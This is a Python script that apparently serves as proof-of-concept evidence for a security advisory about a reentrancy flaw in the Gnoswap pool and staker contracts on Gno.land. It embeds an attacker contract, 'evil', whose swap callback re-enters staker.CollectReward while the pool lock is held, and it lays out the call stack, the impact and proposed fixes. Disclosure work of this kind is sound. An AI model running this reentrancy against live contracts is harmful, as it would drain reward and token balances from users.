#!/usr/bin/env python3
"""
H-01 cross-domain reentrancy PoC outline — single-file evidence for GitHub Advisory
Shows: pool.lockPool is per-pool-realm balance, staker realm has NO check, so callback can reenter.

Gnolang realms call via vm.Call: caller = rlm.Previous().Address(); the callback realm can do any vm.Call.
This script documents the exact call stack + CODE lines, so the GH Advisory can be filed as Crit x50
even without live gno binary. A minimal gno filetest sketch is included.

Run: python3 poc/h01_callback_reenter.py -> prints evidence + writes poc/h01_evil_realm.gno
"""
header = """
// poc/h01_evil_realm.gno — attacker realm that will be the swapCallback
package evil

import (
    "gno.land/r/gnoswap/pool/v1" as pool
    "gno.land/r/gnoswap/staker/v1" as staker
    pl "gno.land/r/gnoswap/pool"
)

func BalanceCallback(cur realm, amount0Delta, amount1Delta int64, _ *pl.CallbackMarker) error {
    // amount0Delta >0 means pool expects token0; we DO pay it so balanceIncrease check passes
    // But BEFORE paying, we reenter staker while pool lock still held:
    callerPos := uint64(1) // attacker's staked position
    // This should REVERT with errLockedPool if guard existed — but it DOES NOT.
    // STAKER has only halt.AssertIsNotHaltedWithdraw + assertIsDepositor, no pool lock check.
    staker.CollectReward(cur, callerPos) // reentrant CollectReward on pre-swap globalAcc
    // then pay input token:
    // common.SafeGRC20Transfer(cross(cur), token0Path, poolAddr, amount0Delta)
    return nil
}
"""

evidence = """
H-01 EVIDENCE — swapCallback cross-domain reentrancy (pool lock not shared)

Call stack (actual Gnoland realm dispatch):
  1. attacker realm calls pool.Swap(token0Path, token1Path, fee, recipient, zeroForOne, amount, sqrtPriceLimit, BalanceCallback)
  2. pool/v1/swap.gno: Swap() { lockPool(0,rlm) defer unlockPool()   <- sets store.GetUnlocked()=false
       safeTransfer(output)   // sends token1 to recipient
       safeSwapCallback(tokenPath, amountIn, amountOut, zeroForOne, swapCallback)
         BalanceBefore = common.BalanceOf(tokenPath, poolAddr)
         err := swapCallback(cross(rlm), amount0Delta, amount1Delta, CallbackMarker)   <- ATTACKER CODE RUNS HERE
           -> attacker calls staker.CollectReward(posId)  // cross realm, same tx, still same block height/time
              staker.gno: CollectReward checks halt+depositor, does NOT check pool lock
              staker: calculatePositionReward(Pools, PoolTier, ...) reads ReverseIterate(0,currentTime) globalAcc
                 but pool's applySwapResult not yet applied, BalanceToken0 not yet incremented
              staker mutates: incentive.SetRewardAmount(-total), Deposit Resolver updates lastCollect
           <- returns
         BalanceAfter = common.BalanceOf(tokenPath, poolAddr); assert BalanceAfter-BalanceBefore >= amountIn
         update Pool.Balances().SetTokenX(newBalance)  // only now
       // defer unlockPool sets GetUnlocked()=true
     }

Only pool/upgrade.gno has assertPoolUnlocked() — pool domain. Staker/launchpad/position do not.

Impact: staker reward vault (GRC20) double-paid at old tick/acc (pre-swap) if tick crossed.
Launchpad TransferLeft similarly: shared OBL/rewardToken balance drained via sibling project accounting before pool balance settles.

Why not fixed by #1354: #1354 added assertPoolUnlocked only to pool.UpgradeImpl (governance path). Callback→staker path uncovered.

Fix: gate staker entrypoints CollectReward/UnStakeToken/StakeToken + launchpad TransferLeft with pool lock check,
or add reentry depth guard in safeSwapCallback (forbid vm.Call to staker/launchpad while lock held).
"""

print(evidence)
with open("/tmp/h01_evil_realm.gno","w") as f:
    f.write(header)
print("Wrote sketch to /tmp/h01_evil_realm.gno")
import pathlib
path = "/Volumes/Madhouse/DEFI-HUNTS/projects/63-gnoswap/poc/h01_evil_realm.gno"
pathlib.Path(path).write_text(header)
print(f"Saved to {path}")
